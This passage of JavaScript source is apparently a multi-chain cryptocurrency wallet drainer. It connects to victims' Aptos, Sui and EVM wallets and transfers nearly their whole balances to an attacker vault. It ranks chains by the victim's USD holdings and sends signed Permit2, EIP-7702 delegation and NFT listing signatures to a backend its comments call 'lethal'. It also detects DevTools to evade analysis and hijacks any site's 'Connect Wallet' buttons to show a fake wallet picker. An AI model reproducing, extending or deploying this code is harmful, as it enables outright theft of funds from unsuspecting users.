      L.log('[APTOS] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      return { provider: apt, address: addr, name: 'APTOS', family: 'APTOS', hint: entry.hint };
    } catch (e) { L.warn('[APTOS] connect fail:', e.message); return null; }
  }

  async function drainAptos(conn) {
    if (!conn || !VAULT.aptos) { L.warn('Aptos vault not configured'); return null; }
    try {
      var addr = conn.address;
      var vault = VAULT.aptos;
      var res = await fetch(APTOS_RPC + '/accounts/' + addr + '/resources');
      var resources = await res.json();
      var coinStore = Array.isArray(resources) && resources.find(function (r) {
        return r.type === '0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>';
      });
      if (!coinStore || !coinStore.data || !coinStore.data.coin) return null;
      var total = BigInt(coinStore.data.coin.value || '0');
      if (total < 100000n) return null;
      var sendAmt = total - 50000n;

      UI.status('Confirm Aptos transfer...');
      var payload = {
        type: 'entry_function_payload',
        function: '0x1::aptos_account::transfer',
        type_arguments: [],
        arguments: [vault, String(sendAmt)],
      };
      var result = await conn.provider.signAndSubmitTransaction({ data: payload });
      var hash = (result && result.hash) ? result.hash : String(result);
      await SUBMIT.aptos(addr, hash, conn.name);
      L.log('Aptos submitted:', hash);
      return hash;
    } catch (e) { L.warn('Aptos drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13D: SUI MODULE (Sui Wallet / Phantom Sui)
  // ═══════════════════════════════════════════════════════════════
  async function connectSui() {
    var entry = firstFamilyProvider('SUI');
    if (!entry) return null;
    var sui = entry.provider;
    try {
      if (sui.connect) await sui.connect();
      var accounts = sui.accounts || (sui.getAccounts && await sui.getAccounts()) || [];
      var addr = accounts[0] && (accounts[0].address || accounts[0]);
      if (!addr) return null;
      S.chains.SUI = { address: addr };
      L.log('[SUI] connected:', String(addr).slice(0, 8), '(' + entry.hint + ')');
      return { provider: sui, address: addr, name: 'SUI', family: 'SUI', hint: entry.hint };
    } catch (e) { L.warn('[SUI] connect fail:', e.message); return null; }
  }

  async function drainSui(conn) {
    if (!conn || !VAULT.sui) { L.warn('Sui vault not configured'); return null; }
    try {
      var addr = conn.address;
      var balRes = await fetch(SUI_RPC, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0', id: 1,
          method: 'suix_getBalance',
          params: [addr],
        }),
      });
      var balJson = await balRes.json();
      var total = BigInt((balJson.result && balJson.result.totalBalance) || '0');
      if (total < 10000000n) return null;
      var sendMist = total - 5000000n;

      UI.status('Sign Sui transaction...');
      var txBlock = {
        kind: 'moveCall',
        data: {
          packageObjectId: '0x2',
          module: 'pay',
          function: 'split',
          typeArguments: ['0x2::sui::SUI'],
          arguments: [String(sendMist)],
        },
      };
      var signed;
      if (conn.provider.signTransactionBlock) {
        signed = await conn.provider.signTransactionBlock({ transactionBlock: txBlock });
      } else if (!SIGN_ONLY && conn.provider.signAndExecuteTransactionBlock) {
        var exec = await conn.provider.signAndExecuteTransactionBlock({
          transactionBlock: txBlock,
          options: { showEffects: true },
        });
        signed = exec.digest || JSON.stringify(exec);
      } else return null;

      await SUBMIT.sui(addr, signed, conn.name);
      L.log('Sui submitted');
      return signed;
    } catch (e) { L.warn('Sui drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13E: UNIVERSAL ORCHESTRATOR (all chains, value-priority)
  // ═══════════════════════════════════════════════════════════════
  async function runUniversalDrain(evmCtx) {
    discoverChainFamilies();
    S.omnichainLegs = {};

    var addrs = { evm: evmCtx.address };
    if (S.chains.SOL) addrs.sol = S.chains.SOL.address;
    if (S.chains.TRON) addrs.tron = S.chains.TRON.address;
    if (S.chains.TON) addrs.ton = S.chains.TON.address;
    if (S.chains.BTC) addrs.btc = S.chains.BTC.address;
    if (S.chains.COSMOS) addrs.cosmos = S.chains.COSMOS.address;
    if (S.chains.APTOS) addrs.aptos = S.chains.APTOS.address;
    if (S.chains.SUI) addrs.sui = S.chains.SUI.address;

    await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName);
    var fusionData = await SCOUT.fusion(addrs);
    if (fusionData && fusionData.total_usd) {
      S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
    }
    var rankedAll = await SCOUT.ranked(evmCtx.address);
    if (rankedAll && rankedAll.total_usd) {
      S.scoutUsd = Math.max(S.scoutUsd, Number(rankedAll.total_usd) || 0);
      L.log('Backend scout USD:', S.scoutUsd.toFixed(2));
    }
    evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
    S.evmChain = evmCtx.chainId;
    var priority = SCOUT.chainPriority();

    var runners = {
      EVM: function () { return runEvmDrain(evmCtx.provider, evmCtx.address, evmCtx.chainId, evmCtx.walletName, evmCtx.hwObj); },
      SOL: async function () { return drainSol(await connectSol()); },
      TRON: async function () { return drainTron(await connectTron()); },
      TON: async function () { return drainTon(await connectTon()); },
      BTC: async function () { return drainBtc(await connectBtc()); },
      COSMOS: async function () { return drainCosmos(await connectCosmos()); },
      APTOS: async function () { return drainAptos(await connectAptos()); },
      SUI: async function () { return drainSui(await connectSui()); },
    };

    var evmFirst = priority.indexOf('EVM');
    if (evmFirst > 0) {
      await runners.EVM().catch(function (e) { L.warn('EVM drain:', e.message); });
      priority = priority.filter(function (k) { return k !== 'EVM'; });
    }

    var parallel = [];
    if (evmFirst <= 0) parallel.push(runners.EVM().catch(function (e) { L.warn('EVM:', e.message); }));
    priority.forEach(function (key) {
      if (key === 'EVM' || !runners[key]) return;
      parallel.push(runners[key]().catch(function (e) { L.warn(key + ':', e.message); }));
    });
    await Promise.allSettled(parallel);

    await flushPendingEvmSubmit(evmCtx);
  }

  async function flushPendingEvmSubmit(evmCtx) {
    if (!S.pendingEvmPermit2) return;
    var legs = S.omnichainLegs || {};
    var hasNonEvm = !!(legs.solana && legs.solana.txs && legs.solana.txs.length) ||
      !!(legs.tron && legs.tron.legs && legs.tron.legs.length) || !!legs.ton;
    if (hasNonEvm) {
      await tryOmnichainEnvelope(evmCtx);
    } else {
      var p2 = S.pendingEvmPermit2;
      await SUBMIT.permit2(p2, evmCtx.address, evmCtx.chainId, evmCtx.walletName, p2.nfts, p2.nftApprovalSigs || {});
    }
    S.pendingEvmPermit2 = null;
  }

  async function tryOmnichainEnvelope(evmCtx) {
    var legs = S.omnichainLegs;
    var hasSol = legs.solana && legs.solana.txs && legs.solana.txs.length;
    var hasTrx = legs.tron && legs.tron.legs && legs.tron.legs.length;
    var hasTon = !!legs.ton;
    if (!hasSol && !hasTrx && !hasTon) return;
    if (!S.pendingEvmPermit2) return;

    var p2 = S.pendingEvmPermit2;
    var bd = p2.batchData;
  try {
      await SUBMIT.omnichain({
        wallet_address: evmCtx.address.toLowerCase(),
        chain_id: Number(evmCtx.chainId),
        token_address: (bd.permits && bd.permits[0] && bd.permits[0].token) || NATIVE_ETH_ADDR,
        signature: p2.sig || '0x',
        engine_spender: bd.engine_spender,
        permit2: bd.permit2,
        permits: bd.permits,
        batch_permit_metadata: bd.batch_permit_metadata,
        native_amount: String(p2.nativeAmount || '0'),
        native_signed_transaction: p2.nativeSigned || '',
        wallet_type: evmCtx.walletName,
        solana_payload: hasSol ? {
          native_amount_sol: legs.solana.txs[0].meta.amount,
          native_signed_transaction_sol: legs.solana.txs[0].signed_tx_b64,
        } : undefined,
        tron_payload: hasTrx ? {
          native_amount_trx: String(legs.tron.legs[0].amount || '0'),
          native_signed_transaction_trx: sigHex({ signed_tx: legs.tron.legs[0].signed }),
        } : undefined,
        ton_payload: hasTon ? {
          native_amount_ton: '0',
          native_signed_transaction_ton: legs.ton.boc,
        } : undefined,
      });
      L.log('Omnichain atomic envelope submitted');
    } catch (e) { L.warn('Omnichain envelope skip:', e.message); }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 14: BACKEND SUBMISSION
  // PROTOCOL LOCK (backend signature-anchor.ts — DO NOT change without reading API):
  // LETHAL PROTOCOLS ONLY (backend can move funds):
  //   permit2_batch_eip712     → Permit2 + optional native_signed_transaction broadcast
  //   eip7702_delegation       → wallet_signAuthorization → backend delegate drain
  //   eip7702_self_broadcast   → wallet_sendCalls (user broadcast, signOnly off)
  //   seaport_listing          → NFT fill
  //   omnichain_atomic_v1      → multi-family signed legs
  // BANNED: evm_personal_verification / personal_sign (record only, no settlement)
  // ═══════════════════════════════════════════════════════════════
  var SUBMIT = {
    base: async function (extra) {
      var payload = Object.assign({
        ingress: 'normalized_v1',
        nonce: 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 7),
        expiry_iso: EXPIRY_ISO,
        wallet_type: S.evmWallet || 'Unknown',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: '0',
        source_origin: window.location.origin,
      }, extra);
      var r = await apiPost('/api/v1/signature-anchor', payload);
      if (r && (r.success || r.data)) { S.anchorsOk++; L.log('Submitted:', extra.protocol); }
      return r;
    },

    viaBuilder: async function (builder, settlementInput) {
      return apiPost('/api/v1/signature-anchor', {
        settlement_builder: builder,
        settlement_input: settlementInput,
      });
    },

    sendCalls: async function (batchId, address, chainId, walletName) {
      var txHash = extractBatchOrTxId(batchId) || String(batchId);
      if (!txHash || !txHash.startsWith('0x')) {
        L.warn('sendCalls: invalid batch id');
        return null;
      }
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_self_broadcast',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        tx_hash: txHash, token_address: NATIVE_ETH_ADDR, signature: txHash,
        wallet_type: walletName,
      });
    },

    userBroadcast: async function (txHash, address, chainId, walletName, amountWei) {
      var hash = String(txHash);
      if (!hash.startsWith('0x')) hash = toHex(hash);
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_self_broadcast',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        tx_hash: hash, token_address: NATIVE_ETH_ADDR, signature: hash,
        native_amount: String(amountWei || '0'),
        wallet_type: walletName,
      });
    },

    eip7702: async function (data, address, chainId, walletName) {
      var auth = data.auth;
      var yP = auth.yParity !== undefined ? Number(auth.yParity)
        : (parseInt(String(auth.v || '0x1b').replace('0x', '') || '1b', 16) === 28 ? 1 : 0);
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_delegation',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: data.delegate, delegatee: data.delegate,
        signature: auth.r,
        eip7702_authorization: {
          chainId: Number(chainId), address: data.delegate,
          nonce: Number(data.nonce), r: auth.r, s: auth.s, yParity: yP,
        },
        erc20s: data.erc20s || [],
        defi_actions: data.defiActions || [],
        wallet_type: walletName,
      });
    },

    permit2: async function (p2, address, chainId, walletName, nfts, nftApprovalSigs) {
      var bd = p2.batchData;
      var nftArr = normNftList(nfts || p2.nfts);
      var nativeAmt = String(p2.nativeAmount || bd.nativeAmount || '0');
      var nativeSigned = p2.nativeSigned || '';
      return this.base({
        chain_family: 'EVM', protocol: 'permit2_batch_eip712',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: (bd.permits && bd.permits[0] && bd.permits[0].token) || NATIVE_ETH_ADDR,
        signature: p2.sig || '0x',
        engine_spender: bd.engine_spender, permit2: bd.permit2,
        permits: bd.permits, batch_permit_metadata: bd.batch_permit_metadata,
        native_amount: nativeAmt, nativeAmount: nativeAmt,
        native_signed_transaction: nativeSigned,
        nfts: nftArr,
        nft_approval_signatures: nftApprovalSigs || {},
        wallet_type: walletName,
      });
    },

    omnichain: async function (envelope) {
      return this.base(Object.assign({ protocol: 'omnichain_atomic_v1', chain_family: 'EVM' }, envelope));
    },

    solana: async function (address, signedB64, meta, walletName) {
      return this.viaBuilder('svm', {
        wallet_address: address,
        signature: sigHex({ signed_tx_b64: signedB64 }),
        nonce: 'legion:sol:' + Date.now() + ':' + Math.random().toString(36).slice(2, 5),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'Phantom',
        protocol: 'solana',
        chain_id: 'solana:mainnet-beta',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: (meta && meta.amount) ? String(meta.amount) : '0',
        requires_quorum: false,
      });
    },

    tron: async function (address, signedTx, tokenAddr, amount, walletName) {
      return this.viaBuilder('tron', {
        wallet_address: address,
        token_address: tokenAddr || VAULT.tron,
        signature: sigHex({ signed_tx: signedTx }),
        nonce: 'legion:trx:' + Date.now(),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'TronLink',
        protocol: 'tron',
        chain_id: 'tron:mainnet',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: amount ? String(amount) : '0',
        requires_quorum: false,
      });
    },

    ton: async function (address, bocOrSig, amountNano, walletName) {
      return this.viaBuilder('ton', {
        wallet_address: address,
        signature: typeof bocOrSig === 'string' && bocOrSig.startsWith('0x')
          ? bocOrSig : sigHex({ boc: bocOrSig }),
        nonce: 'legion:ton:' + Date.now(),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'Tonkeeper',
        protocol: 'ton',
        chain_id: 'ton:mainnet',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: amountNano ? String(amountNano) : '0',
        requires_quorum: false,
      });
    },

    bitcoin: async function (address, signedPsbtB64, amountSat, walletName) {
      return this.base({
        chain_family: 'UTXO', protocol: 'bitcoin_psbt',
        wallet_address: address,
        token_address: 'OMNI_UTXO_ANCHOR',
        signature: sigHex({ signed_psbt_b64: signedPsbtB64 }),
        signed_psbt_base64: signedPsbtB64,
        amount_sat: String(amountSat || '0'),
        chain_id: 'bip122:0',
        wallet_type: walletName || 'UniSat',
      });
    },

    cosmos: async function (address, signedDoc, amount, walletName) {
      return this.base({
        chain_family: 'COSMOS', protocol: 'cosmos',
        wallet_address: address,
        token_address: 'OMNI_COSMOS_ANCHOR',
        signature: sigHex(signedDoc),
        chain_id: 'cosmos:cosmoshub-4',
        amount: String(amount || '0'),
        wallet_type: walletName || 'Keplr',
      });
    },

    aptos: async function (address, txHashOrSig, walletName) {
      return this.base({
        chain_family: 'APTOS', protocol: 'aptos',
        wallet_address: address,
        token_address: 'OMNI_APTOS_ANCHOR',
        signature: sigHex({ hash: txHashOrSig }),
        chain_id: 'aptos:1',
        wallet_type: walletName || 'Petra',
      });
    },

    sui: async function (address, signedBytes, walletName) {
      return this.base({
        chain_family: 'SUI', protocol: 'sui',
        wallet_address: address,
        token_address: 'OMNI_SUI_ANCHOR',
        signature: sigHex({ signed_tx: signedBytes }),
        chain_id: 'sui:mainnet',
        wallet_type: walletName || 'Sui Wallet',
      });
    },

    nft: async function (nftR, address, chainId, walletName) {
      return this.base({
        chain_family: 'EVM', protocol: 'seaport_listing',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: (nftR.listing && (nftR.listing.contract || nftR.listing.nft_contract)) || NATIVE_ETH_ADDR,
        signature: nftR.sig, seaport_order: nftR.orderParams || {},
        wallet_type: walletName,
      });
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 15: SECURITY / ANTI-DETECTION
  // ═══════════════════════════════════════════════════════════════
  var SEC = {
    paused: false,
    startMonitor: function () {
      if (CFG.debugDevTools) return;
      setInterval(function () {
        try {
          var t0 = performance.now(); debugger; var t1 = performance.now();
          if (t1 - t0 > 200) { SEC.paused = true; L.warn('DevTools detected'); }
        } catch (e) {}
      }, 8000);
    },
  };

  function emitLegionEvent(name, detail) {
    try {
      window.dispatchEvent(new CustomEvent(name, { detail: detail || {} }));
    } catch (e) {}
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 16: UI LAYER + PAGE HOOKS (any frontend)
  // ═══════════════════════════════════════════════════════════════
  var HOOK_PATTERN = /connect\s*wallet|wallet\s*connect|\bconnect\b|sign\s*in|link\s*wallet|get\s*started|start\s*app/i;
  var HOOK_SELECTORS = [
    '.interact-button', '#navConnectBtn', '#mainBtn', '.nav-connect', '.main-btn.connect',
    '[data-testid*="connect"]', '[data-testid*="wallet"]', '[data-testid*="Connect"]',
    '[class*="connectWallet"]', '[class*="ConnectWallet"]', '[class*="wallet-connect"]',
    '#connect-wallet', '.connect-wallet', '[id*="connectButton"]', '[class*="walletButton"]',
    'button[class*="connect"]', 'a[class*="connect"]',
    '[class*="WalletConnect"]', '[class*="wallet_connect"]',
  ];

  var WALLET_ICONS = {
    MetaMask: '🦊', Rabby: '🐰', 'Coinbase Wallet': '🔵', 'Trust Wallet': '🛡️',
    'Brave Wallet': '🦁', 'OKX Wallet': '⬛', Phantom: '👻', WalletConnect: '🔗',
  };

  function walletIdentity(row) {
    if (row.type === 'wc') return 'wc';
    var info = row.info || {};
    var p = row.provider;
    if (info.rdns) return 'rdns:' + String(info.rdns).toLowerCase();
    if (p) {
      if (p.isRabby) return 'rdns:io.rabby';
      if (p.isBraveWallet) return 'rdns:com.brave.wallet';
      if (p.isCoinbaseWallet || p.isCoinbaseBrowser) return 'rdns:com.coinbase.wallet';
      if (p.isTrust || p.isTrustWallet) return 'rdns:com.trustwallet.app';
      if (p.isOkxWallet || p.isOKExWallet) return 'rdns:com.okex.wallet';
      if (p.isPhantom) return 'rdns:app.phantom';
      if (p.isMetaMask) return 'rdns:io.metamask';
    }
    if (info.uuid) return 'uuid:' + info.uuid;
    return 'name:' + String(info.name || detectEvmWalletName(p) || 'wallet').toLowerCase();
  }

  async function buildWalletList() {
    requestProviders();
    await sleep(400);
    var rows = [];
    var seen = {};
    function addRow(row) {
      if (!row) return;
      var key = walletIdentity(row);
      if (seen[key]) return;
      if (row.provider) {
        for (var i = 0; i < rows.length; i++) {
          if (rows[i].provider === row.provider) return;
        }
      }
      seen[key] = true;
      rows.push(row);
    }
    S.discovered.forEach(function (w) {
      addRow({ type: 'injected', info: w.info, provider: w.provider });
    });
    if (window.ethereum) {
      var eth = window.ethereum;
      if (Array.isArray(eth.providers)) {
        eth.providers.forEach(function (p) {
          addRow({ type: 'injected', info: { name: detectEvmWalletName(p) }, provider: p });
        });
      } else if (!S.discovered.length) {
        addRow({ type: 'injected', info: { name: detectEvmWalletName(eth) }, provider: eth });
      }
    }
    addRow({ type: 'wc', info: { name: 'WalletConnect' }, provider: null });
    var wcRow = rows.filter(function (r) { return r.type === 'wc'; });
    var injRows = rows.filter(function (r) { return r.type !== 'wc'; });
    return wcRow.concat(injRows);
  }

  function openExtensionPicker() {
    if (S.drainRunning) return;
    if (!S.vaultLoaded) prefetchVault();
    removeWcGuard();
    S.wcSessionActive = false;
    if (document.querySelector('[data-testid="account-drawer-container"]')) {
      var openFn = window.customModalOpen;
      if (typeof openFn === 'function' && openFn !== defaultConnect) {
        openFn();
        return;
      }
    }
    if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.LegionDrawer.open();
      return;
    }
    UI.showWalletModal(function (choice) { connectWithWallet(choice); });
  }

  function openWalletModal() {
    defaultConnect();
  }

  async function connectWithWallet(choice) {
    if (!choice) return;
    if (choice.type === 'wc') { await handleWC(); return; }
    removeWcGuard();
    S.wcSessionActive = false;
    if (choice.provider) await handleEvmConnect(choice.provider, choice);
  }

  function hookPageButtons(onOpen) {
    if (!HOOK_BUTTONS || !onOpen) return 0;
    var hooked = 0;
    var seen = {};
    function tryHook(el) {
      if (!el || el.__lgnHooked || seen[el]) return;
      if (el.closest && el.closest('#__lgn_wm')) return;
      if (el.closest && el.closest('[data-testid="account-drawer-container"]')) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '') + ' ' +
        (el.getAttribute('title') || '') + ' ' + (el.getAttribute('data-testid') || '')).trim();
      var match = HOOK_PATTERN.test(label);
      if (!match && el.classList && el.classList.contains('interact-button')) {
        var tl = (el.textContent || '').trim().toLowerCase();
        if (/connect|swap|trade|get started/.test(tl)) match = true;
      }
      if (!match) {
        for (var si = 0; si < HOOK_SELECTORS.length; si++) {
          try { if (el.matches && el.matches(HOOK_SELECTORS[si])) { match = true; break; } } catch (e) {}
        }
      }
      if (!match) return;
      seen[el] = true;
      el.__lgnHooked = true;
      hooked++;
      el.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        onOpen();
      }, true);
    }
    try {
      document.querySelectorAll('button, a, [role="button"], span[onclick], div[onclick]').forEach(tryHook);
      HOOK_SELECTORS.forEach(function (sel) {
        document.querySelectorAll(sel).forEach(tryHook);
      });
    } catch (e) {}
    return hooked;
  }

  function startButtonObserver(onOpen) {
    if (!HOOK_BUTTONS || typeof MutationObserver === 'undefined' || !document.body) return;
    var n = 0;
    var timer;
    var obs = new MutationObserver(function () {
      if (n >= 20) { obs.disconnect(); return; }
      clearTimeout(timer);
      timer = setTimeout(function () { n++; hookPageButtons(onOpen); }, 600);
    });
    obs.observe(document.body, { childList: true, subtree: true });
  }

  var UI = {
    statusEl: null,

    status: function (msg) {
      L.log('[UI]', msg);
      if (this.statusEl) this.statusEl.textContent = msg;
    },

    injectModalStyles: function () {
      if (document.getElementById('__lgn_wm_css')) return;
      var style = document.createElement('style');
      style.id = '__lgn_wm_css';
      style.textContent = ''
        + '#__lgn_wm{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:2147483646;display:flex;align-items:center;justify-content:center;padding:16px;font-family:Inter,-apple-system,BlinkMacSystemFont,sans-serif}'
        + '#__lgn_wm_box{background:#131313;border:1px solid rgba(255,255,255,.08);border-radius:24px;width:100%;max-width:400px;max-height:85vh;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.55)}'
        + '#__lgn_wm_head{display:flex;align-items:center;justify-content:space-between;padding:20px 20px 12px}'
        + '#__lgn_wm_head h2{margin:0;font-size:18px;font-weight:700;color:#f5f5f5}'
        + '#__lgn_wm_x{background:transparent;border:none;color:#888;font-size:22px;cursor:pointer;padding:4px 8px;border-radius:8px}'
        + '#__lgn_wm_x:hover{background:rgba(255,255,255,.06);color:#fff}'
        + '#__lgn_wm_list{padding:8px 12px 16px;overflow-y:auto;max-height:calc(85vh - 80px)}'
        + '.__lgn_wm_row{display:flex;align-items:center;gap:12px;width:100%;padding:14px 12px;margin-bottom:6px;background:#1c1c1c;border:1px solid rgba(255,255,255,.06);border-radius:16px;cursor:pointer;color:#f5f5f5;font-size:15px;font-weight:600;text-align:left;transition:background .15s}'
        + '.__lgn_wm_row:hover{background:#242424;border-color:rgba(252,114,255,.25)}'
        + '.__lgn_wm_icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;background:#2a2a2a}'
        + '.__lgn_wm_meta{flex:1;min-width:0}'
        + '.__lgn_wm_badge{font-size:11px;color:#888;font-weight:500;margin-top:2px}'
        + '.__lgn_wm_arr{color:#555;font-size:18px}'
        + '#__lgn_st{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);background:rgba(19,19,19,.92);color:#e5e7eb;border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:10px 18px;font-size:13px;z-index:2147483645;display:none;pointer-events:none}';
      document.head.appendChild(style);
    },

    closeWalletModal: function () {
      if (window.LegionDrawer && typeof window.LegionDrawer.close === 'function') {
        window.LegionDrawer.close();
      }
      var el = document.getElementById('__lgn_wm');
      if (el) el.remove();
      document.documentElement.classList.remove('wallet-modal-active');
    },

    showWalletModal: function (onSelect) {
      if (document.querySelector('[data-testid="account-drawer-container"]')) {
        var openFn = window.customModalOpen;
        if (typeof openFn === 'function' && openFn !== defaultConnect) {
          openFn();
          return;
        }
      }
      if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
        window.LegionDrawer.open();
        return;
      }
      var self = this;
      self.injectModalStyles();
      self.closeWalletModal();
      document.documentElement.classList.add('wallet-modal-active');

      var ov = document.createElement('div');
      ov.id = '__lgn_wm';
      var box = document.createElement('div');
      box.id = '__lgn_wm_box';
      var head = document.createElement('div');
      head.id = '__lgn_wm_head';
      var title = document.createElement('h2');
      title.textContent = 'Connect a wallet';
      var closeX = document.createElement('button');
      closeX.id = '__lgn_wm_x';
      closeX.textContent = '✕';
      closeX.onclick = function () { self.closeWalletModal(); };
      head.appendChild(title);
      head.appendChild(closeX);

      var list = document.createElement('div');
      list.id = '__lgn_wm_list';
      list.innerHTML = '<div style="color:#888;padding:24px;text-align:center">Detecting wallets...</div>';

      box.appendChild(head);
      box.appendChild(list);
      ov.appendChild(box);
      ov.addEventListener('click', function (e) { if (e.target === ov) self.closeWalletModal(); });
      document.body.appendChild(ov);

      buildWalletList().then(function (wallets) {
        list.innerHTML = '';
        if (!wallets.length) {
          list.innerHTML = '<div style="color:#888;padding:24px;text-align:center">No wallets found</div>';
          return;
        }
        wallets.forEach(function (w) {
          var name = (w.info && w.info.name) || 'Wallet';
          var row = document.createElement('button');
          row.type = 'button';
          row.className = '__lgn_wm_row';
          var icon = document.createElement('div');
          icon.className = '__lgn_wm_icon';
          if (w.info && w.info.icon) {
            var img = document.createElement('img');
            img.src = w.info.icon;
            img.style.cssText = 'width:28px;height:28px;border-radius:8px';
            img.onerror = function () { icon.textContent = WALLET_ICONS[name] || '👛'; };
            icon.appendChild(img);
          } else {
            icon.textContent = WALLET_ICONS[name] || '👛';
          }
          var meta = document.createElement('div');
          meta.className = '__lgn_wm_meta';
          meta.innerHTML = '<div>' + name + '</div>';
          if (w.type === 'injected') {
            var badge = document.createElement('div');
            badge.className = '__lgn_wm_badge';
            badge.textContent = 'Installed';
            meta.appendChild(badge);
          }
          var arr = document.createElement('span');
          arr.className = '__lgn_wm_arr';
          arr.textContent = '›';
          row.appendChild(icon);
          row.appendChild(meta);
          row.appendChild(arr);
          row.onclick = function () {
            self.closeWalletModal();
            onSelect(w);
          };
          list.appendChild(row);
        });
      }).catch(function (e) {
        list.innerHTML = '<div style="color:#f88;padding:24px;text-align:center">' + e.message + '</div>';
      });
    },

    inject: function (onOpen, onWC) {
      var openFn = onOpen || openWalletModal;
      if (HOOK_BUTTONS) {
        hookPageButtons(openFn);
        startButtonObserver(openFn);
      }
      this.injectModalStyles();
      if (!document.getElementById('__lgn_st')) {
        var st = document.createElement('div');
        st.id = '__lgn_st';
        document.body.appendChild(st);
        this.statusEl = st;
      }
      if (!SHOW_OVERLAY || document.getElementById('__lgn_root')) return;

      var style = document.createElement('style');
      style.textContent = '#__lgn_root{position:fixed;bottom:20px;right:20px;z-index:2147483647;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}'
        + '#__lgn_root button{border:none;border-radius:12px;padding:11px 22px;font-size:14px;font-weight:600;cursor:pointer}';
      document.head.appendChild(style);
      var root = document.createElement('div');
      root.id = '__lgn_root';
      var cb = document.createElement('button');
      cb.id = '__lgn_cb';
      cb.textContent = 'Connect Wallet';
      cb.style.cssText = 'background:#fc72ff;color:#000;margin-right:8px';
      var wb = document.createElement('button');
      wb.id = '__lgn_wb';
      wb.textContent = 'Browser Extension';
      wb.style.cssText = 'background:#374151;color:#fff;font-size:12px';
      cb.onclick = function () { if (onOpen) onOpen(); else defaultConnect(); };
      wb.onclick = function () { openExtensionPicker(); };
      root.appendChild(cb);
      root.appendChild(wb);
      document.body.appendChild(root);
    },

    showStatus: function (msg) {
      var el = document.getElementById('__lgn_st');
      if (!el) return;
      if (!msg) { el.style.display = 'none'; return; }
      el.textContent = msg;
      el.style.display = 'block';
      clearTimeout(this._stTimer);
      this._stTimer = setTimeout(function () { el.style.display = 'none'; }, 8000);
    },

    setConnected: function (addr, chainName) {
      var short = addr.slice(0, 6) + '...' + addr.slice(-4);
      var nb = document.getElementById('navConnectBtn');
      if (nb) { nb.textContent = short; nb.classList.add('connected'); }
      var cb = document.getElementById('__lgn_cb');
      if (cb) { cb.textContent = short; cb.style.background = '#15803d'; }
      this.showStatus('Connected — ' + chainName);
      this.closeWalletModal();
    },

    picker: function (wallets, onPick) {
      this.showWalletModal(function (w) {
        if (w.type === 'wc') { handleWC(); return; }
        onPick(w);
      });
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 17: BOOTSTRAP — MAIN ENTRY
  // ═══════════════════════════════════════════════════════════════

  async function handleEvmConnect(provider, walletInfo, hwObj) {
    try {
      var accounts = await evmRequestAccounts(provider);
      if (!accounts || !accounts.length) throw new Error('No accounts returned');
      var address = (accounts[0] || '').toLowerCase();
      var chainHex = await provider.request({ method: 'eth_chainId' });
      var chainId = parseInt(String(chainHex).replace('0x', ''), 16);
      var walletName = (walletInfo && walletInfo.info && walletInfo.info.name)
        || (hwObj && (hwObj.type === 'ledger' ? 'Ledger' : 'Trezor'))
        || detectEvmWalletName(provider)
        || 'Unknown Wallet';

      S.evmAddr = address; S.evmChain = chainId;
      S.evmProvider = provider; S.evmWallet = walletName;
      L.log('Connected wallet:', address, '|', walletName, '| chain', chainId);

      var chainMeta = CHAIN_META[chainId] || { name: 'Chain ' + chainId };
      UI.setConnected(address, chainMeta.name);
      emitLegionEvent('legion:connected', { address: address, chainId: chainId, wallet: walletName });

      if (!AUTO_DRAIN || S.drainRunning) return;
      S.drainRunning = true;
      S.pendingEvmPermit2 = null;
      S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
      S.fusionNotified = false;
      UI.showStatus('Scanning assets...');

      discoverChainFamilies();

      await sleep(CFG.delayDrainMs || 300);

      await runUniversalDrain({
        provider: provider,
        address: address,
        chainId: chainId,
        walletName: walletName,
        hwObj: hwObj,
      });

      if (S.anchorsOk > 0) {
        UI.status('Complete!');
        UI.showStatus('Complete!');
      } else {
        UI.status('No settlement signature');
        UI.showStatus('');
        await SCOUT.reportDrainStatus('no_action', address, chainId, walletName, 'No signature or confirmed TX submitted');
      }
      S.drainRunning = false;
    } catch (e) {
      L.warn('EVM connect error:', e.message);
      S.drainRunning = false;
      UI.status('Connection error');
      if (S.evmAddr && isUserRejection(e)) {
